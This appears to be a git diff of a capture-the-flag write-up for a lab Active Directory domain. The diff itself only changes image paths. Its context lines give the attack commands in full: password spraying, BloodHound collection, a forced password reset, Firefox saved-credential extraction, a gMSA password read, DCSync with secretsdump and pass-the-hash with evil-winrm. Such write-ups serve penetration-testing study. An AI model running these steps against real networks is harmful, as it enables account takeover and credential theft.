@@ -1,6 +1,6 @@
 # StellarComms (Medium)
 
-![image.png](<../.gitbook/assets/image (9).png>)
+![image.png](<../../.gitbook/assets/image (9).png>)
 
 ## Objective / Scope
 
@@ -100,26 +100,26 @@ PORT      STATE SERVICE       REASON          VERSION
 ftp anonymous@10.0.27.30
 ```
 
-![image.png](<../.gitbook/assets/image 1 (8).png>)
+![image.png](<../../.gitbook/assets/image 1 (8).png>)
 
 * use `mget *.txt mget *.pdf` to download all the files
 
-![image.png](<../.gitbook/assets/image 2 (8).png>)
+![image.png](<../../.gitbook/assets/image 2 (8).png>)
 
-![image.png](<../.gitbook/assets/image 3 (8).png>)
+![image.png](<../../.gitbook/assets/image 3 (8).png>)
 
 * We discovered an installer file `Firefox Setup 91.0esr.exe` in the `IT` folder on the FTP server.
 * Legitimate software you can download and inspect (e.g., for version/vuln info/credential hunting).
 * Lets inspect the files we found
 
-![image.png](<../.gitbook/assets/image 4 (8).png>)
+![image.png](<../../.gitbook/assets/image 4 (8).png>)
 
-![image.png](<../.gitbook/assets/image 5 (8).png>)
+![image.png](<../../.gitbook/assets/image 5 (8).png>)
 
 * We discovered a Default password in `Stellar_UserGuide.pdf` file
 * We can test the password against the user `junior.analyst`
 
-![image.png](<../.gitbook/assets/image 6 (6).png>)
+![image.png](<../../.gitbook/assets/image 6 (6).png>)
 
 * There credentials are valid
 
@@ -130,7 +130,7 @@ nxc smb 10.0.27.30 -u junior.analyst -p 'REDACTED' --generate-hosts-file hosts
 
 ```
 
-![image.png](<../.gitbook/assets/image 7 (8).png>)
+![image.png](<../../.gitbook/assets/image 7 (8).png>)
 
 * Added to `etc/hosts`
 
@@ -147,7 +147,7 @@ nxc smb 10.0.27.30 -u junior.analyst -p 'REDACTED' --generate-hosts-file hosts
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 8 (7).png>)
+    ![image.png](<../../.gitbook/assets/image 8 (7).png>)
 
     * We enumerated for other users
     *   we can perform a password spraying attack against the discovered users with the password we found in one of the pdf.
@@ -156,7 +156,7 @@ nxc smb 10.0.27.30 -u junior.analyst -p 'REDACTED' --generate-hosts-file hosts
         nxc smb 10.0.27.30  -u users.txt -p 'REDACTED' --continue-on-success
         ```
 
-        ![image.png](<../.gitbook/assets/image 9 (8).png>)
+        ![image.png](<../../.gitbook/assets/image 9 (8).png>)
 
         * Only user `junior.analyst` can authenticate with the password.
 
@@ -168,7 +168,7 @@ nxc smb 10.0.27.30 -u junior.analyst -p 'REDACTED' --generate-hosts-file hosts
     nxc ldap DC-STELLAR.stellarcomms.local -u 'junior.analyst' -p 'REDACTED' --bloodhound --collection All --dns-server 10.0.27.30
     ```
 
-    ![image.png](<../.gitbook/assets/image 10 (8).png>)
+    ![image.png](<../../.gitbook/assets/image 10 (8).png>)
 
 ### Bloodhound enumeration
 
@@ -178,7 +178,7 @@ There is a lot we can find and do with bloodhound. My to-do is as below for quic
 * Check for all Kerberoastable user accounts
 * Find Shortest path to admin
 
-![image.png](<../.gitbook/assets/image 11 (8).png>)
+![image.png](<../../.gitbook/assets/image 11 (8).png>)
 
 *   The user `JUNIOR.ANALYST@STELLARCOMMS.LOCAL` has the ability to modify the owner of the group `STELLAROPS-CONTROL@STELLARCOMMS.LOCAL.`
 
@@ -198,15 +198,15 @@ There is a lot we can find and do with bloodhound. My to-do is as below for quic
     net rpc group members "stellarops-control" -U 'stellarcomms.local'/'junior.analyst'%'REDACTED' -S "DC-STELLAR.stellarcomms.local"
     ```
 
-    ![image.png](<../.gitbook/assets/image 12 (8).png>)
+    ![image.png](<../../.gitbook/assets/image 12 (8).png>)
 
-    ![image.png](<../.gitbook/assets/image 13 (8).png>)
+    ![image.png](<../../.gitbook/assets/image 13 (8).png>)
 
-    ![image.png](<../.gitbook/assets/image 14 (8).png>)
+    ![image.png](<../../.gitbook/assets/image 14 (8).png>)
 
-    ![image.png](<../.gitbook/assets/image 15 (6).png>)
+    ![image.png](<../../.gitbook/assets/image 15 (6).png>)
 
-![image.png](<../.gitbook/assets/image 16 (6).png>)
+![image.png](<../../.gitbook/assets/image 16 (6).png>)
 
 *   The members of the group `STELLAROPS-CONTROL@STELLARCOMMS.LOCAL` have the capability to change the user `OPS.CONTROLLER@STELLARCOMMS.LOCAL's` password without knowing that user's current password.
 
@@ -214,9 +214,9 @@ There is a lot we can find and do with bloodhound. My to-do is as below for quic
     net rpc password "ops.controller" "RedBlue777" -U 'stellarcomms.local'/'junior.analyst'%'REDACTED' -S "DC-STELLAR.stellarcomms.local"
     ```
 
-    ![image.png](<../.gitbook/assets/image 17 (7).png>)
+    ![image.png](<../../.gitbook/assets/image 17 (7).png>)
 
-![image.png](<../.gitbook/assets/image 18 (5).png>)
+![image.png](<../../.gitbook/assets/image 18 (5).png>)
 
 *   The user `OPS.CONTROLLER@STELLARCOMMS.LOCAL` is a member of the group `REMOTE MANAGEMENT USERS@STELLARCOMMS.LOCAL.`
 
@@ -226,9 +226,9 @@ There is a lot we can find and do with bloodhound. My to-do is as below for quic
     gci C:\ -Include 'user.txt' -File -Recurse -ErrorAction SilentlyContinue | % { "=== $($_.FullName) ==="; gc -Raw -Encoding UTF8 $_.FullName }
     ```
 
-    ![image.png](<../.gitbook/assets/image 19 (7).png>)
+    ![image.png](<../../.gitbook/assets/image 19 (7).png>)
 
-![image.png](<../.gitbook/assets/image 20 (6).png>)
+![image.png](<../../.gitbook/assets/image 20 (6).png>)
 
 * There is an installer for `Firefox Setup 91.0esr.exe` and we could try now is to extract the browser credentials.
 * In Firefox, **saved credentials are not stored in plaintext**. They’re split across **two files `logins.json` and `key4.db`**
@@ -240,7 +240,7 @@ https://fourcore.io/blogs/threat-hunting-browser-credential-stealing
 
 https://pentestlab.blog/2024/08/20/web-browser-stored-credentials/
 
-![image.png](<../.gitbook/assets/image 21 (7).png>)
+![image.png](<../../.gitbook/assets/image 21 (7).png>)
 
 * We can try using `LaZagne.exe`
 
@@ -255,7 +255,7 @@ dir "C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\*\key4.db"
 
 ```
 
-![image.png](<../.gitbook/assets/image 22 (7).png>)
+![image.png](<../../.gitbook/assets/image 22 (7).png>)
 
 ```bash
 cd "C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr"
@@ -266,15 +266,15 @@ download "C:/Users/ops.controller/AppData/Roaming/Mozilla/Firefox/Profiles/v8mn7
 download "C:/Users/ops.controller/AppData/Roaming/Mozilla/Firefox/Profiles/v8mn7ijj.default-esr/key4.db"
 ```
 
-![image.png](<../.gitbook/assets/image 23 (7).png>)
+![image.png](<../../.gitbook/assets/image 23 (7).png>)
 
 [https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)
 
 [https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)
 
-![image.png](<../.gitbook/assets/image 24 (7).png>)
+![image.png](<../../.gitbook/assets/image 24 (7).png>)
 
-![image.png](<../.gitbook/assets/image 25 (7).png>)
+![image.png](<../../.gitbook/assets/image 25 (7).png>)
 
 * We now have a set of credential `astro.researcher:'REDACTED'`
 *   We can spray the password amongst all the users
@@ -283,11 +283,11 @@ download "C:/Users/ops.controller/AppData/Roaming/Mozilla/Firefox/Profiles/v8mn7
     nxc smb 10.0.27.30  -u users.txt -p 'REDACTED' --continue-on-success
     ```
 
-    ![image.png](<../.gitbook/assets/image 26 (7).png>)
+    ![image.png](<../../.gitbook/assets/image 26 (7).png>)
 
 ## Bloodhound Continuation
 
-![image.png](<../.gitbook/assets/image 27 (6).png>)
+![image.png](<../../.gitbook/assets/image 27 (6).png>)
 
 *   The user `ASTRO.RESEARCHER@STELLARCOMMS.LOCAL` has permissions to modify the DACL (Discretionary Access Control List) on the user `ENG.PAYLOAD@STELLARCOMMS.LOCAL`
 
@@ -303,11 +303,11 @@ download "C:/Users/ops.controller/AppData/Roaming/Mozilla/Firefox/Profiles/v8mn7
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 28 (5).png>)
+    ![image.png](<../../.gitbook/assets/image 28 (5).png>)
 
-    ![image.png](<../.gitbook/assets/image 29 (5).png>)
+    ![image.png](<../../.gitbook/assets/image 29 (5).png>)
 
-![image.png](<../.gitbook/assets/image 30 (5).png>)
+![image.png](<../../.gitbook/assets/image 30 (5).png>)
 
 *   `SATLINK-SERVICE$@STELLARCOMMS.LOCAL` is a Group Managed Service Account. The user `ENG.PAYLOAD@STELLARCOMMS.LOCAL` can retrieve the password for the `GMSA SATLINK-SERVICE$@STELLARCOMMS.LOCAL.`
 
@@ -327,9 +327,9 @@ download "C:/Users/ops.controller/AppData/Roaming/Mozilla/Firefox/Profiles/v8mn7
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 31 (4).png>)
+    ![image.png](<../../.gitbook/assets/image 31 (4).png>)
 
-![image.png](<../.gitbook/assets/image 32 (4).png>)
+![image.png](<../../.gitbook/assets/image 32 (4).png>)
 
 * The user `SATLINK-SERVICE$@STELLARCOMMS.LOCAL` has the DS-Replication-Get-Changes-All permission on the domain STELLARCOMMS.LOCAL.
 * Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes, a principal may perform a `DCSync attack.`
@@ -340,7 +340,7 @@ secretsdump.py -just-dc \
   -hashes :'REDACTED'
 ```
 
-![image.png](<../.gitbook/assets/image 33 (4).png>)
+![image.png](<../../.gitbook/assets/image 33 (4).png>)
 
 ```bash
 evil-winrm -i 10.0.27.30 -u Administrator -H 'REDACTED'
@@ -350,4 +350,4 @@ evil-winrm -i 10.0.27.30 -u Administrator -H 'REDACTED'
 gci C:\ -Include 'root.txt' -File -Recurse -ErrorAction SilentlyContinue | % { "=== $($_.FullName) ==="; gc -Raw -Encoding UTF8 $_.FullName }
 ```
 
-![image.png](<../.gitbook/assets/image 34 (3).png>)
+![image.png](<../../.gitbook/assets/image 34 (3).png>)
